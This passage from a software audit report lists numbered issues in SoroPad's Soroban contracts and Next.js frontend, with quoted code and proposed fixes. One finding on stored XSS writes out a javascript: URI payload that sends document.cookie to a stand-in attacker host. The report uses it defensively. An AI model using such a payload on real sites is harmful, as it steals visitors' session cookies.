| `cancel_admin_proposal` emits an event | yes, `cncl_adm` (line 449) | no event at all |

So a vesting proposal never expires, can be made to point at the current admin, and can be silently overwritten by a second `propose_admin` call — with no event for the admin dashboard to react to on cancellation. A `propose_admin` to a wrong address is a permanent footgun: the only way out is for the current admin to overwrite it, and nothing on-chain records that this happened.

**Fix:** Port the token's implementation: add `PendingAdminExpiry`, reject self-proposals, expire on read in `pending_admin()` the way the token's does at lines 912–927, and emit an event from `cancel_admin_proposal`. Then add a test in the vesting contract that mirrors the token's existing proposal-expiry tests, so the two suites stop diverging.

---

### 171. Airdrop: `MAX_ENTRY_TTL_LEDGERS` is the SDK test-harness value, with a comment asserting it is the mainnet value

🔴 **High** · `contracts` `airdrop` `correctness` (regression of #139)

**Files:** `contracts/airdrop/src/lib.rs` lines 12–37, 186, 254, 428, 434–441

**Issue:** Wave 9's #139 established that `6_312_000` is the `soroban-sdk` **test environment** default (`soroban-sdk/src/env.rs`), not a network value, and that the live `max_entry_ttl` is 3,110,400 on both testnet and mainnet. It was removed from `contracts/token` and `contracts/vesting`. The airdrop contract, added later in Wave 8 as #370, has it — and its doc comment states the falsehood as fact:

```rust
/// Soroban's network-enforced ceiling on how far into the future a ledger
/// entry's TTL can be extended in a single call (`max_entry_ttl` in the
/// network config; 6,312,000 ledgers on mainnet). Passing a value above
/// this to `extend_ttl` fails the transaction.
const MAX_ENTRY_TTL_LEDGERS: u32 = 6_312_000;
```

Every TTL request in the contract routes through it: `TTL_LEDGERS` (line 24) is defined as `min(YEAR_LEDGERS, MAX_ENTRY_TTL_LEDGERS)`, and `TTL_LEDGERS` is used at line 186 (`initialize`), line 254 (per-claim marker) and line 428 (`_bump_instance`). So all three ask for 6,307,200 ledgers against a real ceiling of 3,110,400.

Because these are instance and **persistent** entries, the host silently clamps rather than erroring, so nothing breaks outright today. What it does is reproduce exactly the failure mode #139 described for the token: the code appears to ask for a year and the network gives 180 days, and the next person to read the source is told the wrong number with a confident citation. The comment is worse than the constant — it is a claim about a live network parameter that was never checked.

The clamp in `_claim_ttl` compounds it. `remaining.clamp(TTL_LEDGERS, MAX_ENTRY_TTL_LEDGERS)` has `TTL_LEDGERS` (6,307,200) as the lower bound, so it returns `TTL_LEDGERS` for every input — the `remaining` computation is dead code, and the "always keep at least the default horizon" comment describes a behaviour that is really "always use the default horizon regardless of the deadline".

**Fix:** Delete `MAX_ENTRY_TTL_LEDGERS` and clamp against `env.storage().max_ttl()` at the three call sites, exactly as `contracts/token`'s `_ttl_ledgers` does:

```rust
fn _ttl_ledgers(env: &Env) -> u32 { TTL_LEDGERS.min(env.storage().max_ttl()) }
```

Correct the doc comment to cite the live value the way wave 9's verification note does, and note that network settings change by validator vote. Rewrite `_claim_ttl` so `remaining` is the upper bound and the default horizon is the floor (`remaining.max(TTL_LEDGERS)`), or drop the function and use the clamp — but do not leave a computation whose result cannot vary. Then grep the whole `contracts/` tree for the literal `6_312_000`; the fact that it survived a wave that specifically hunted for it says the guardrail is missing, which is the subject of #159's fix.

---

### 172. Airdrop: `fund` after `reclaim` traps the tokens with no recovery

🟡 **Medium** · `contracts` `airdrop` `correctness`

**Files:** `contracts/airdrop/src/lib.rs` lines 200–217 (`fund`), 280–307 (`reclaim_unclaimed`)

**Issue:** The reclaim is single-shot by design, and the doc says so:

```rust
/// Single-shot: once reclaimed, the airdrop is closed for good and any
/// later `claim` fails rather than draining a re-funded balance.
```

But `fund` has no `Reclaimed` check:

```rust
// lines 200–217
pub fn fund(env: Env, from: Address, amount: i128) {
    Self::_require_initialized(&env);
    from.require_auth();
    if amount <= 0 { panic_with_error!(&env, AirdropError::InvalidAmount); }
    let token_addr = Self::_token(&env);
    token::Client::new(&env, &token_addr).transfer(&from, env.current_contract_address(), &amount);
    Self::_bump_instance(&env);
    env.events().publish((symbol_short!("fund"), from), amount);
}
```

The sequence: deadline passes, admin sweeps, admin notices an under-funded airdrop and tops it up to run a second round. `fund` succeeds. `claim` fails with `DeadlinePassed` because the deadline is unchanged. `reclaim_unclaimed` fails with `AlreadyReclaimed`. The tokens are in the contract and there is no function that moves them out. They are gone until an upgrade, and the airdrop contract has no `upgrade`.

`fund`'s own doc advertises the use case that leads here: "so an under-funded airdrop can be topped up again later without redeploying." That is true, and it is the exact situation the trap creates.

**Fix:** Reject `fund` once `Reclaimed` is set, with a new `AlreadyReclaimed` return on that path, and point the UI at redeploying. Better, add `extend_deadline(u32)` admin-only and bounded (say, to at most `2 ×` the original horizon from the current ledger) so a second round is possible without a new deployment, and have `fund` refuse when `Reclaimed` is set regardless. Either way the invariant is: **the contract must never hold a balance it cannot move.** Add a test that funds, reclaims, funds again, and asserts the second fund is rejected.

---

### 173. Four contracts, four different admin surfaces

🟡 **Medium** · `contracts` `architecture` `security` `quality`

**Files:** all four `contracts/*/src/lib.rs`

**Issue:** The four contracts were written at different times against different ideas of what an admin should be able to do, and nothing reconciled them:

| Capability | token | vesting | factory | airdrop |
| --- | :---: | :---: | :---: | :---: |
| two-step admin transfer | ✅ | ✅ (weaker, #170) | ❌ single `admin` | ❌ single `admin` |
| proposal expiry | ✅ | ❌ | — | — |
| `revoke_admin` / immutability | ✅ | ✅ | ❌ | ❌ |
| `pause` / `unpause` | ✅ | ✅ | ❌ | ❌ |
| `upgrade` | ✅ | ✅ | ❌ (immutable) | ❌ |
| events for every admin action | ✅ | ❌ (`cancel` silent) | partial | ❌ (no admin-lifecycle events at all) |
| typed error enum | ✅ 25 | ✅ 22 | ✅ | ✅ 13 |
| admin surfaced in the UI | ✅ full panel | ✅ dashboard | n/a | **❌ no admin UI anywhere** |

Two consequences a user will hit. An airdrop admin has a single `admin` key that can never be changed and no way to hand the airdrop to anyone else — the only escape is to deploy a new contract and abandon the funded one. And the frontend has no admin surface for the airdrop at all: `app/airdrop/AirdropBuilder.tsx` builds and deploys, `AirdropClaim.tsx` claims, and nothing anywhere can top up an airdrop, extend its deadline, or sweep it.

**Fix:** Write the capability matrix above into `docs/` as a decision record, then converge on one answer. The cheapest consistent target is the token's surface — two-step transfer with expiry, `revoke_admin`, `pause`, `upgrade`, an event per action — applied to `airdrop` and `factory` in that order, since the airdrop holds user funds and the factory holds the code hash. Do the two-step transfer first: it is a storage change plus a getter plus an event, and it is the one that leaves a user permanently unable to recover their role.

---

### 174. Factory: the token WASM hash is swappable with no timelock and no two-step

🟡 **Medium** · `contracts` `factory` `security`

**Files:** `contracts/factory/src/lib.rs` lines 163–174 (`set_token_wasm_hash`), 205–251 (`deploy_token`)

**Issue:** Every token ever created by SoroPad is a `deploy_token` invocation against whatever WASM the factory's `DataKey::TokenWasmHash` pointed at that moment. The pointer is one call away from changing:

```rust
pub fn set_token_wasm_hash(env: Env, wasm_hash: BytesN<32>) { /* _require_admin */ }
```

There is no timelock, no propose/accept pair, and no event carrying the previous hash. So a compromised factory admin, or a compromised factory admin's wallet, can swap the hash and every subsequent deploy — and any user who has the factory address bookmarked, or who arrives from a stale copy of the docs — runs unreviewed code that looks like a SoroPad token. The token contract's own `upgrade` has the same weakness, but it is per-token and at least the victim is the token's own admin; here the blast radius is every future launch.

The mitigation already exists in the product and is simply not used at the point that matters. `components/ui/ContractVerificationBadge.tsx` and `GET /api/wasm-manifest` exist to let a user confirm the code they are about to interact with is the audited build. `useDeployToken` never asks (see #195), and the contract offers nothing to ask about.

**Fix:** Convert it to a two-step `propose_token_wasm_hash` / `accept_token_wasm_hash` with a delay of at least a few hours, and emit the old and new hash in the proposal event so a third party can watch for a change and object. Separately, add a `TokenWasmHashChanged(current, proposed, effective_ledger)` event even if the two-step is deferred, because an event is what makes the change monitorable and there is currently no way to observe the change at all.

---

## Part 3: Unbounded work and copy-paste

### 175. Vesting: four aggregate getters loop `0..count` with no cap

🟡 **Medium** · `contracts` `vesting` `correctness` `resource-limits`

**Files:** `contracts/vesting/src/lib.rs` lines 753–769 (`total_vested`), 771–786 (`total_released`), 788–806 (`total_releasable`), 808–823 (`get_all_schedules`)

**Issue:** All four iterate the full schedule range for a recipient:

```rust
// line 756 (and the same shape three more times)
let count = Self::_schedule_count(&env, &recipient);
let mut total: i128 = 0;
for i in 0..count {
    let key = Self::_schedule_key(&recipient, i);
    if let Some(schedule) = env.storage().persistent().get::<DataKey, VestingSchedule>(&key) { ... }
}
```

`count` comes from `DataKey::ScheduleCount`, which `create_schedule` increments without limit and `prune_recipient` never decrements. So a recipient's schedule count is bounded only by how many times the admin is willing to call `create_schedule` — and the batch path (#166) lets fifty land per transaction. At a few hundred schedules these getters exceed the Soroban compute budget and become permanently uncallable, which means `total_releasable` breaks before `release` does. `release_all` has the same loop (line 834) and would brick at the same threshold, with the additional problem that the user cannot even find out how much they are owed.

This is a denial-of-service vector with a real trigger: a well-meaning admin creating a second grant for someone who already has fifty.

**Fix:** Add a per-recipient schedule cap in `create_schedule` — a new `TooManySchedules` error and a limit around 50, matching the batch call's own cap — so the invariant holds at the writer rather than being defended at four readers. Then add `get_schedules_paginated(recipient, start, limit)` alongside the existing `get_all_schedules`, and have the frontend aggregates page. The cap alone fixes the resource problem; the pagination is what lets the cap be generous enough to be useful.

---

### 176. Token: `transfer_from` and `burn_from` are forty duplicated lines

🟢 **Trivial** · `contracts` `token` `quality` `correctness`

**Files:** `contracts/token/src/lib.rs` lines 765–822 and 827–871

**Issue:** The two functions are identical from the allowance check to the allowance write — the guard, the temporary-storage read, the expiry comparison, the `InsufficientAllowance` panic, the `stored.expect(...)`, the remaining-allowance rewrite, the `max_ttl` clamp, the `extend_ttl`, the zero-case `remove` — and then diverge only in the final call (`_transfer` vs `_burn`) and the trailing TTL extension. About forty of each function's fifty lines are the same code.

This is not cosmetic. It is the reason the #344 clamp had to be added twice: `git log` shows `c858d6d9 fix(token): clamp extend_ttl in transfer_from and burn_from to max_ttl` as a single commit that edited both, and the same duplication is why a future fix to the allowance path has to be applied in two places and remembered. Wave 9's closing note recommended requiring a failing-first test; this is the code shape that makes that hard to honour.

**Fix:** Extract `_spend_allowance(env, spender, from, amount) -> ()` holding the whole block, and call it from both. The signature keeps the `expect` honest because the helper is only called after the caller has verified. Add one test for the helper's four branches (sufficient, insufficient, zeroing out, expired) and let both functions' tests cover only the value movement.

---

### 177. Token: `burn` and `burn_self` are byte-identical

🟢 **Trivial** · `contracts` `token` `quality` (regression of #107)

**Files:** `contracts/token/src/lib.rs` lines 304–317 and 400–413

**Issue:** Wave 8's #107 noted the duplication; it is still there, including the doc comments, which differ only in the second line:

```rust
// 304–317
/// Burn `amount` tokens from `from`. Owner only (standard burn).
/// Refuses to run when the account is frozen so a holder cannot
/// dodge a freeze by destroying tokens.
pub fn burn(env: Env, from: Address, amount: i128) { /* _check_paused, require_auth, >0, frozen, _burn */ }

// 400–413
/// Burn `amount` tokens from the caller's own balance. Refuses to
/// run when the account is frozen so a holder cannot
/// dodge a freeze by destroying tokens.
pub fn burn_self(env: Env, from: Address, amount: i128) { /* identical body */ }
```

Two SEP-41 entry points with the same semantics and the same parameter list is a genuine confusion hazard at the API surface: a wallet integrating against SEP-41 will call `burn`, an integrator reading the SoroPad docs will call `burn_self`, and both work identically, so the choice is arbitrary and undocumented. It also doubles the test surface — `test_burn_*` and `test_burn_self_*` are parallel suites over the same logic.

**Fix:** Make `burn_self` a one-line forwarder to `burn` and note in its doc that it is an alias retained for the launchpad's own UI (`UserPanel` calls one of them). Delete the duplicated tests and keep one suite. This was raised in #107 and should be closed there rather than duplicated here — update the existing issue with the line numbers and close it when the forwarder lands.

---

### 178. Vesting: `get_recipients_paginated` takes an uncapped `limit`

🟢 **Trivial** · `contracts` `vesting` `resource-limits`

**Files:** `contracts/vesting/src/lib.rs` lines 702–724

**Issue:** The caller sets the page size:

```rust
// lines 709–722
let end = start.saturating_add(limit).min(total);
let mut paginated = Vec::new(&env);
let mut i = start;
while i < end { /* push if present */ i += 1; }
```

There is no upper bound. A caller passing `limit: 4_000_000_000` makes the host attempt to build and serialise a vector that large, which burns the transaction's compute budget and resource fee on a read — a read that returns nothing the caller did not already have. The factory's `get_deployments_paginated` has the same shape.

**Fix:** `let end = start.saturating_add(limit.min(MAX_PAGE)).min(total);` with `const MAX_PAGE: u32 = 100;`, and document it on both functions. The frontend's `VestingDashboard` requests in small pages already, so nothing observable changes.

---

## Part 4: The indexer, the event pipeline, and "recent launches"

### 179. `fetchRecentTokens` matches every contract on the network — it is not a launch feed

🔴 **High** · `frontend` `indexer` `correctness` `product`

**Files:** `frontend/lib/recentTokens.ts` lines 75–87; `frontend/app/components/RecentLaunches.tsx`; `GET /api/tokens/recent`

**Issue:** The feed filters on a bare topic symbol:

```ts
// lines 75–80
const initTopic = StellarSdk.xdr.ScVal.scvSymbol("init").toXDR("base64");
const initEvents = await safeGetEvents(getEvents, {
  startLedger,
  filters: [{ type: "contract", topics: [[initTopic]] }],
  pagination: { limit: 200 },
});
```

`symbol_short!("init")` is not namespaced. Every SEP-41 token contract on Stellar, and this project's vesting, airdrop and factory contracts, publish an `init` event. So the "recent launches" widget on the landing page and `/dashboard` is populated from **every token deployment on testnet and mainnet**, most of which have nothing to do with SoroPad. It then calls `fetchTokenInfo` on each and renders whatever comes back.

The visible symptom is a feed full of unrelated tokens presented as SoroPad launches. The one that matters is the trust symptom: this is the widget a first-time visitor sees, and it is the first thing that tells them the product does not know what it launched.

The factory already solves the identification problem on-chain — `get_deployments_paginated` (factory line 270) is a registry of exactly the tokens SoroPad created, and the factory is a known address. The feed does not use it.

**Fix:** Drive the feed from the factory. Either enumerate `get_deployments_paginated` and hydrate each contract, or — much cheaper, since it is one RPC call either way — keep the event scan but intersect the resulting contract IDs with the factory's registry before calling `fetchTokenInfo` on them. The second option keeps the "recent first" ordering for free. Add a test that a mocked `getEvents` returning an `init` event from a contract *not* in the factory registry produces an empty result.

---

### 180. `NEXT_PUBLIC_MERCURY_AUTH_TOKEN` ships the indexer credential in the client bundle

🔴 **High** · `frontend` `security` `indexer`

**Files:** `frontend/lib/indexer.ts` lines 10–11, 27–43; `frontend/lib/recentTokens.ts`; `frontend/.env.example`; `.env.example`

**Issue:** The Mercury indexer token is read from a `NEXT_PUBLIC_` variable:

```ts
// lines 10–11
const DEFAULT_MERCURY_AUTH_TOKEN =
  process.env.NEXT_PUBLIC_MERCURY_AUTH_TOKEN ?? "";
```

`NEXT_PUBLIC_*` is inlined into the client bundle at build time by Next.js and is readable by anyone who opens devtools. `getMercuryConfig` (line 27) is called from `fetchIndexedEvents` (line 145), which is called from `lib/stellar.ts`'s `fetchTransactionHistory` and `fetchAccountOperations` — both of which run in the browser on the token dashboard. So if the variable is set, the credential is in the JavaScript.

The current state is the other failure: the variable is **not** set, `getMercuryConfig` returns `null` (line 38), and every event read in the app falls back to the RPC path — which is the path with #161's cursor bug, #183's 1000-ledger window, and no history. So the app has neither the indexer nor a working fallback, and the only way to turn the indexer on is the one way that leaks the key.

**Fix:** Split the two uses. The server route (`app/api/tokens/recent/route.ts`) should read a server-only `MERCURY_AUTH_TOKEN` with no `NEXT_PUBLIC_` prefix and never forward the credential to the client. Client-side code should not call Mercury at all — it should call the route, which proxies. Add a lint rule or a CI grep that fails if `NEXT_PUBLIC_.*TOKEN|.*SECRET|.*KEY` appears in `frontend/`, because the `NEXT_PUBLIC_` prefix is a compile-time disclosure and this variable name makes that easy to miss.

---

### 181. One filter per topic breaks global ordering and splits the page limit

🟡 **Medium** · `frontend` `indexer` `correctness`

**Files:** `frontend/lib/indexer.ts` lines 65–76, 98–102; `frontend/lib/stellar.ts` lines 1075, 1108, 1372, 1468

**Issue:** `TRACKED_EVENT_TOPICS` is a flat list of topic-0 symbols and each becomes its own filter:

```ts
// lines 65–71
if (topics && topics.length > 0) {
  for (const topic of topics) {
    filters.push({ contractIds: [contractId], topics: [[topic]] });
  }
}
```

With twenty tracked token topics that is twenty filters in one `getEvents` call. Three problems follow, all of them about ordering:

1. **The results are concatenated per filter, not merged by ledger.** `response.events` is whatever the RPC returns for an OR of twenty filters, and the code then reads `events[events.length - 1].ledger` as "the newest thing we saw" (line 123). If the RPC emits filter-by-filter, that last event belongs to whichever filter happened to be last, not to the newest ledger — so the derived cursor (#161) is wrong in a second, independent way.
2. **`limit` applies to the combined result**, so twenty filters share one budget of 200. A token with heavy `transfer` traffic and a rare `revoked` event will have the `revoked` event pushed out of the page by transfers, and #161's cursor will then skip past the ledger it was in.
3. **Soroban RPC caps the number of filters per request.** Twenty is at or past the practical limit on public endpoints, and exceeding it produces an error that `fetchEventsFromRpc` wraps as a generic "Failed to fetch events from Soroban RPC" (line 130) — indistinguishable from an outage.

**Fix:** Do not filter on topic-0 in the RPC path. Fetch the contract's events with a single `contractIds` filter and filter by topic client-side, which is what `decodeActivityEvent` and `fetchTransactionHistory`'s own `typePath` check (stellar.ts line 1386) already do. One filter, one ordering, one budget. If a topic filter is kept for volume reasons, cap the tracked list to the handful that matter for the feed and document which ones were dropped.

---

### 182. `normalizeEvent` has a no-op ternary and turns a missing ledger into 0

🟢 **Trivial** · `frontend` `indexer` `quality` `correctness`

**Files:** `frontend/lib/indexer.ts` lines 238–246

**Issue:** The two branches of this ternary are the same expression:

```ts
const ledger =
  typeof (e.ledger ?? e.ledger_seq ?? e.ledger_sequence ?? e.ledgerSequence) === "number"
    ? Number(e.ledger ?? e.ledger_seq ?? e.ledger_sequence ?? e.ledgerSequence)
    : Number(e.ledger ?? e.ledger_seq ?? e.ledger_sequence ?? e.ledgerSequence) || 0;
```

Both arms are `Number(...)`; only the second has `|| 0`. This is the residue of a refactor, and it hides the more interesting half: **when the upstream payload has no ledger field under any of its four spellings, `normalizeEvent` returns `0` and the caller cannot tell that apart from a real event at ledger 0.** A ledger-0 event then sorts to the top of every descending sort, sits at the wrong end of every "load more" page, and — combined with #161's cursor — makes the derived next-cursor `ledger-1`, which `startLedger` then treats as a valid position.

There is a related default three lines up: a missing or unparseable timestamp becomes `new Date(0).toISOString()`, i.e. 1970, which `ActivityFeed` renders as a date rather than as "unknown".

**Fix:** Collapse the ternary to the single expression it is trying to be, and make the absent case explicit rather than a magic zero: return `ledger: number | null` and have the two call sites skip events with no ledger, because an event that cannot be placed in the chain is not usable in a chain-ordered feed. Same for the timestamp — return `null` and let the feed render "—".

---

### 183. Without Mercury, a 1000-ledger window is presented as the token's full history

🟡 **Medium** · `frontend` `indexer` `correctness` `dashboard`

**Files:** `frontend/lib/indexer.ts` lines 91–95; `frontend/lib/stellar.ts` lines 1365–1378, 1459–1497; `frontend/app/dashboard/[contractId]/TransactionHistory.tsx`; `frontend/app/dashboard/[contractId]/ActivityFeed.tsx`

**Issue:** The RPC fallback's no-cursor path anchors 1000 ledgers back:

```ts
// lines 92–95
if (startLedger === undefined) {
  const ledgerInfo = await rpc.getLatestLedger();
  startLedger = Math.max(1, ledgerInfo.sequence - 1000);
}
```

1000 ledgers at five seconds is about **83 minutes**. Everything downstream treats that window as the token's entire history:

- `fetchTransactionHistory` returns it as `TransactionItem[]` with a `nextCursor`, and `TransactionHistory.tsx` labels the section "Transaction History" with a CSV and a PDF export.
- `fetchAccountOperations` returns 10 records as the activity feed's first page.
- Neither carries any indication that the window is truncated, and the one console warning (`indexer.ts:149`) goes to the developer's terminal, not the user.

The result is a dashboard that confidently reports a token's history and is wrong for any token older than 90 minutes — which is every real token. Combined with #180 (Mercury is off by default), this is the default state of the product's main data view.

**Fix:** Return the window's start ledger alongside the events and have the UI state it: "showing the last ~83 minutes; full history requires the indexer". `TokenDashboard` already has a `TokenStatusBanner` and a `ContractVerificationBadge` — the truncated-index state belongs next to them. Then make the RPC path walk backwards from the head until it has a page the UI is willing to call "history", or accept that 83 minutes is the product's honest limit and say so in the docs. Either is fine; silently presenting it as complete is not.

---

### 184. `TransactionHistory`'s "total minted" and "total recipients" are computed from one page

🟢 **Trivial** · `frontend` `dashboard` `correctness`

**Files:** `frontend/app/dashboard/[contractId]/TransactionHistory.tsx` lines 67–84

**Issue:** The stats card is computed from whatever is currently in the loaded list:

```ts
const stats = useMemo(() => {
  let totalMinted = BigInt(0);
  const recipients = new Set<string>();
  history.forEach((tx) => { if (tx.type === "mint") { totalMinted += BigInt(tx.amount); ... } });
  return { totalMinted: formatTokenAmount(totalMinted.toString(), decimals), totalRecipients: recipients.size };
}, [history, decimals]);
```

`history` is the accumulated page list, defaulting to one 200-event page, and it shrinks and grows with "load more". So the figure labelled as a total is a running sum over the events loaded so far, and it **goes down** when nothing is loaded and up when more is. The same `useMemo` feeds the CSV and PDF export (line 87), so the exported file inherits the same partiality with no marker.

The contract has `total_supply()` and `total_burned()` as exact getters. If the card wants "total minted", `total_supply() + total_burned()` is the correct answer, it costs one simulation, and it does not depend on how much history happens to be loaded.

**Fix:** Read the exact figure from the contract and label the recipient count honestly — "recipients seen in loaded history" — or drop the recipient stat, since a truncated address set presented as a count is worse than no count. Add a note to the CSV export recording the window it covers.

---

### 185. `TokenErrorMessages` stops at 23 and `VestingErrorMessages` at 17

🟡 **Medium** · `frontend` `correctness` `dashboard` `ux`

**Files:** `frontend/lib/soroban.ts` lines 31–55 and the `VestingErrorMessages` map below it; `contracts/token/src/lib.rs` lines 93–150; `contracts/vesting/src/lib.rs` lines 13–61; `contracts/airdrop/src/lib.rs` lines 63–98

**Issue:** The token's error enum grew to 25 variants and the message map was not extended:

```ts
export const TokenErrorMessages: Record<number, string> = {
  1: "Transfer rejected by compliance rules.",
  // ...
  23: "Contract has not been initialized yet.",
};
```

Codes 24 (`AlreadyAdmin`) and 25 (`ProposalExpired`) have no entry. The vesting map covers 1–17 against 22 variants, so `CliffInPast`, `ExceedsVestingLimit`, `Underfunded`, `InvalidWasmHash` and `Locked` are all unmapped. The airdrop's 13 and the factory's are not mapped at all.

A user who triggers `ProposalExpired` — which #170 makes more likely, and which the token's expiry feature makes reachable in normal use — gets whatever the fallback renders, which per `lib/stellar.ts`'s seven swallow-and-default sites is frequently nothing at all. `Underfunded` (#20 in the vesting enum) is the one that hurts most: it is the error a vesting admin gets when they try to create a schedule they cannot afford, and it is the error that tells them why.

**Fix:** Generate the maps from the contract sources rather than maintaining them by hand — `scripts/generate_events_doc.py` already parses `.publish(...)` sites and CI runs it with `--check`; extending it to parse `#[contracterror]` enums and emit `frontend/lib/*ErrorMessages.ts` is a small addition to a tool that exists. That is strictly better than filling in 20 strings, because the failure mode here is *the enum grows and the map does not*, and that is exactly what a generator prevents. Failing CI when an enum variant has no message is the version worth having.

---

### 186. `RecentLaunches` is a fixed 12 with no cursor and no way to page

🟢 **Trivial** · `frontend` `product` `ux`

**Files:** `frontend/lib/recentTokens.ts` lines 22–24, 92–94, 152–158; `frontend/app/components/RecentLaunches.tsx`

**Issue:** The feed is a hard-coded top twelve:

```ts
const MAX_CANDIDATES = 20;
const MAX_RESULTS = 12;
// ...
return tokens.slice(0, MAX_RESULTS);
```

`MAX_CANDIDATES = 20` is the deeper problem. The RPC call asks for `limit: 200` (line 79) and the code then keeps twenty of them and discards the rest — so on a busy network the candidate set is the first twenty the RPC happened to return, and there is no cursor to ask for the next twenty. The `init` event scan follows no pagination at all, so everything past the RPC's first page is invisible regardless of `MAX_CANDIDATES`.

`GET /api/tokens/recent` caches the result for 60 seconds in a module-level `Map` (route line 11), so a page refresh inside that window gets the same twelve. There is no `?cursor=`, no `?limit=`, and no "load more" in the component.

**Fix:** Thread the indexer cursor through `fetchRecentTokens` into the route (`?cursor=`), return `nextCursor` in the JSON, and give the component a "load more". While you are there, raise `MAX_CANDIDATES` to follow the event page limit rather than truncating 200 down to 20, and move the cache to a real TTL store rather than a module-level `Map` that resets on every serverless cold start.

---

## Part 5: Frontend correctness

### 187. `AdminPanel` renders `<VestingDashboard>` twice

🟡 **Medium** · `frontend` `dashboard` `correctness`

**Files:** `frontend/app/dashboard/[contractId]/components/AdminPanel.tsx` lines 172–184

**Issue:** The same component is mounted twice with identical props, under two copies of the same comment:

```tsx
{/* ── Vesting Dashboard ── */}
<VestingDashboard tokenContractId={contractId} decimals={decimals} read={admin.read} />

{/* ── Vesting Dashboard ── */}
<VestingDashboard tokenContractId={contractId} decimals={decimals} read={admin.read} />
```

`VestingDashboard` is 716 lines and reads every recipient, schedule and aggregate on the contract. Two mounts means two full sets of RPC reads on every admin page load, two independent pollers, and two copies of every loading and error state on screen. The duplicated comment suggests it was a bad merge or a copy-paste during the AdminPanel split, and the branch's HEAD commit message claims the rebuild found and fixed four bugs, so it plausibly introduced this one.

**Fix:** Delete lines 179–184. Then add the cheapest possible guard against the class, because a duplicate JSX mount is invisible to every check currently in CI: a lint rule or a one-line test that renders `AdminPanel` and asserts the `VestingDashboard` test-id appears exactly once.

---

### 188. Contract validation is format-only, so any well-formed `C…` address renders as a token dashboard

🟡 **Medium** · `frontend` `correctness` `security`

**Files:** `frontend/lib/contractValidation.ts` (whole file); `frontend/lib/stellar.ts` lines 632, 643, 674, 682, 690, 739, 749; `frontend/app/components/InvalidTokenContract.tsx`; `frontend/app/token/[network]/[contractId]/PublicTokenPage.tsx` line 425

**Issue:** The shared validator says exactly what it does:

```ts
/**
 * Returns `true` when `contractId` matches the expected Stellar contract-ID
 * format.  Does **not** perform any on-chain validation.
 */
export function isValidContractId(contractId: string): boolean {
  return CONTRACT_ID_REGEX.test(contractId);
}
```

That is honest and correct as a cheap pre-flight guard. The problem is what it became. Commit `4134b1ed fix(frontend): stop reporting unreachable RPC as an invalid token` removed the on-chain check that used to distinguish "this is not a token" from "we could not reach the RPC", and in doing so also removed the only thing that told a user they had pasted the wrong address. `lib/stellar.ts` now has seven `try`-and-default sites that turn any getter failure — including "this contract has no `name()` function" — into a zero-value `TokenInfo`. `PublicTokenPage` line 425 still renders `InvalidTokenContract`, but only when `error` is set, and `error` is now only set on transport failure.

So `/token/testnet/C<any 55 base-32 chars>` renders a full public token page for a contract that is not a token, with empty name and symbol, no error, and no way to tell. `InvalidTokenContract` is effectively dead code.

The fix commit was right about the failure it addressed — an unreachable RPC should not read as an invalid token — but the two cases need to be distinguished, not merged.

**Fix:** Keep the format check where it is, and add a real capability probe that runs once and reports three states rather than two: *not a contract*, *a contract without a token interface*, *a token*. `simulateTransaction` against `name()` distinguishing a missing export from a failed call is enough, and `lib/stellar.ts` already has the pattern in `set_compliance_node`'s probe on the contract side. Make `InvalidTokenContract` handle the middle state, and keep its transport-failure copy for the first.

---

### 189. `toBaseUnits` throws and no caller catches it

🟡 **Medium** · `frontend` `correctness`

**Files:** `frontend/lib/utils.ts` lines 82–86; callers in `frontend/app/deploy/DeployForm.tsx` lines 194, 196, 479, 481; `frontend/app/dashboard/[contractId]/components/TransferPanel.tsx` line 33; `frontend/app/hooks/useDeployToken.ts` lines 213, 227

**Issue:** The exact-arithmetic rewrite from #137 is right about its arithmetic and introduced a throw into a function that previously returned `0n`:

```ts
if (fraction.length > decimals) {
  throw new RangeError(
    `toBaseUnits: "${text}" has ${fraction.length} decimal places but this token supports ${decimals}`,
  );
}
```

That is the correct behaviour — silently rounding would send an amount the user did not ask for — but every call site is written for the old contract. `TransferPanel.tsx` line 33 validates the amount with `!isNaN(Number(val)) && Number(val) > 0`, which `"0.000000001"` passes on a 7-decimal token. The form is valid, the action is enabled, and clicking it throws a `RangeError` from inside the submit handler. `DeployForm` has the same shape: the zod schema checks `/^[0-9]+$/` on `initialSupply` and `maxSupply`, so a decimal point fails validation with a message about being a whole number — which is a *different* and more confusing error than "this token has 7 decimals" — but `StepSupply` is not the only caller, and `StepReview`'s preview (line 479) calls `toBaseUnits` during render with no guard at all.

**Fix:** Keep the throw; make the callers handle it. Wrap each call site in a helper that converts the `RangeError` into a field-level zod error, and add `max(2)` style validation to the schema tied to the selected `decimals` so the form prevents it rather than the action reporting it. The preview path in `StepReview` must not throw during render — return the unparsed string for display instead.

---

### 190. `contract_uri` renders as a raw `href`, and `update_contract_uri` validates nothing

🟡 **Medium** · `frontend` `security` `contracts` `token`

**Files:** `frontend/app/dashboard/[contractId]/TokenDashboard.tsx` lines 210–232; `frontend/app/dashboard/[contractId]/components/admin/adminActions.ts` line 291; `contracts/token/src/lib.rs` lines 651–657

**Issue:** The contract accepts any string:

```rust
pub fn update_contract_uri(env: Env, uri: String) {
    Self::_require_admin(&env);
    env.storage().instance().set(&DataKey::ContractUri, &uri);
    env.events().publish((symbol_short!("upd_uri"),), uri);
}
```

No scheme check, no length bound, no host allowlist. And the dashboard puts it straight into an anchor:

```tsx
<a href={tokenInfo.contractUri} target="_blank" rel="noopener noreferrer">
  {tokenInfo.contractUri}
</a>
```

`rel="noopener noreferrer"` controls the *opened* window, not the URL. A URI of `javascript:fetch('https://evil/'+document.cookie)` executes in this origin when an admin or a holder clicks the link. That is a stored XSS with a self-service trigger: the admin arms it in one transaction, and every visitor to the dashboard is the victim. There is no UI that generates the JSON, so today an admin can only set a URI by typing one — and the code exists for exactly that.

The same raw-string treatment applies to `logoUrl`, `website`, `twitter` and `discord` once #160 wires them, so the fix belongs in a shared validator rather than at this one call site.

**Fix:** Validate on both sides. In the contract, reject any URI whose scheme is not `https` or `ipfs`, and cap the length — a new `InvalidContractUri` error, which also gives #185 a real code to map. In the frontend, route the href through a `safeExternalUrl()` helper that allowlists `https:` and `ipfs:` and returns a disabled element otherwise, and use the same helper for the four metadata URLs from #160. Add a test that `javascript:alert(1)` is rejected on-chain and that the dashboard renders a non-clickable element for it.

---

### 191. `fromBaseUnits` produces garbage for negative values

🟢 **Trivial** · `frontend` `correctness` `utils`

**Files:** `frontend/lib/utils.ts` lines 98–106

**Issue:** The inverse of `toBaseUnits` assumes a non-negative input:

```ts
export function fromBaseUnits(raw: bigint, decimals: number): string {
  if (decimals === 0) return raw.toString();
  const divisor = BigInt(10) ** BigInt(decimals);
  const whole = raw / divisor;
  const frac = raw % divisor;
  if (frac === 0n) return whole.toString();
